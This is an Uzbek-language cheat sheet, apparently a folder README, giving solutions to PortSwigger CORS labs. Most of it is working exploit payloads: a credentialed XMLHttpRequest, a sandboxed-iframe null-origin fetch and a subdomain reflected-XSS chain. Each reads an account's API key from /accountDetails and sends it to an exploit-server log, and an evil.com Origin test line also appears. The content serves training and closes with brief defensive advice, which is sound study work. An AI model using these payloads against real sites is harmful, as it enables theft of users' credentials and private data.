# CORS — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Nishon odatda `/accountDetails` (API key qaytaradi) + `Access-Control-Allow-Credentials: true`.
> Test: Repeater'da `Origin:` header qo'shib, `Access-Control-Allow-Origin` da reflect bo'ladimi ko'r.

### Basic origin reflection — APPRENTICE
Server istalgan Origin'ni reflect qiladi → credentialed so'rov bilan API key o'g'irlaysan.
```html
<script>
const xhr = new XMLHttpRequest();
xhr.onload = function () { location = '/log?key=' + this.responseText; };
xhr.open('GET', 'https://example.com/accountDetails', true);
xhr.withCredentials = true;
xhr.send();
</script>
```
> Test: `Origin: https://evil.com` → `Access-Control-Allow-Origin: https://evil.com` reflect bo'lsa zaif.

### Trusted null origin — APPRENTICE
Server `Origin: null` ga ishonadi. Sandboxed iframe `null` origin beradi.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>fetch('https://example.com/accountDetails',{credentials:'include'}).then(r=>r.text()).then(t=>{top.location='https://exploit.example.net/log?k='+encodeURIComponent(t)})</script>"></iframe>
```

### Trusted insecure protocols (subdomain XSS chain) — PRACTITIONER
Server istalgan subdomen'ga (HTTP ham) ishonadi → HTTP stock subdomen'dagi reflected XSS orqali
CORS so'rovini yuborasan.
```html
<script> document.location="http://stock.example.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://example.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit.example.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```
> Chain: subdomain XSS → trusted-subdomain CORS → credentialed `/accountDetails` → key exfil.

---

### Eslatma
Test ketma-ketlik: `Origin:` reflect bo'ladimi → `null` ishonadimi → subdomen/HTTP ishonadimi.
Himoya: ACAO'ni reflect qilma, `null` va subdomenga ishonma, `ACAC:true` bilan wildcard ishlamaydi.
Umumiy: bu papka README.
